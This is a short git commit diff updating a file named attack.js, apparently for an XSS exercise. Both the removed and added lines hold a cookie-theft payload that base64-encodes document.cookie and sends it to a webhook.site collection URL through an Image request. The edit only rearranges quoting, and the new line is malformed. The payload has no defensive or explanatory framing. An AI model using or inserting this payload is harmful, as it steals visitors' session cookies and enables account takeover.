dc55b7a7ffa0682c742afcf7cf7b09f57da97f05
Ioritz <46922333+ioritz1993@users.noreply.github.com>
2025-11-14 09:46:40 +0100

    Update attack.js

--- attack.js
+++ attack.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/eddc3257-91b4-4dda-9c80-a17549e2ebb0'
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/eddc3257-91b4-4dda-9c80-a17549e2ebb0 data='+btoa(document.cookie)';
